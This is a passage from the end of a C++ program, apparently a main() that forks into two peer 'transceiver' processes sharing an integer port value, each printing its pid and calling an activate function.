		child_port =(volatile int*)shared_malloc(sizeof(int));
	
	if ( fork()>0 ) 
	{

		std::cout<<"[+] Peer A transciever , pid=" << getpid()<< std::endl;
 		activate(arg[1]);
	}
	else
	{
		child=true;
		std::cout<<"[+] Peer B transciever, pid= "<< getpid()<<std::endl;
		usleep(1);//context switch
 		activate(arg[1]);
	}	
	std::cout<<std::string(child?"child":"parent")<<" done "<<"."<<std::endl;
	return 0;
}
